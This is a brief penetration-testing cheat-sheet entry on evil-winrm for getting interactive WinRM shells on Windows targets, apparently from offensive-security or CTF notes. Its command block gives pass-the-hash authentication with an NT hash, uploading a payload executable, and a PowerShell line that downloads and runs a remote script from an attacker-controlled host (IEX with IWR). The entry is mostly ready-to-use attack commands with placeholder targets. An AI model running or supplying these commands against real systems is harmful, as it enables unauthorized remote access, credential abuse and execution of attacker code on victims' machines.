# 18.04 WinRM evil-winrm

> Drive interactive WinRM (5985/5986) shells with `evil-winrm` — supports upload/download and in-memory PowerShell.

## Overview

WinRM (5985/5986) is the recommended modern admin protocol. evil-winrm on Kali wraps it into an interactive shell that supports file upload/download and in-memory PowerShell.

## Steps

- **Check port** — Test-WSMan / nc -zv 5985.
- **Authenticate** — password or hash.
- **Run** — interactive shell or one-shot Invoke-Command.

## Commands

### evil-winrm

```bash
evil-winrm -i <TARGET> -u <USER> -p '<PASS>'
evil-winrm -i <TARGET> -u <USER> -H <NT>
# Inside
menu; upload payload.exe; download flag.txt; powershell IEX(IWR http://<LHOST>/r.ps1 -UseBasicParsing)
```
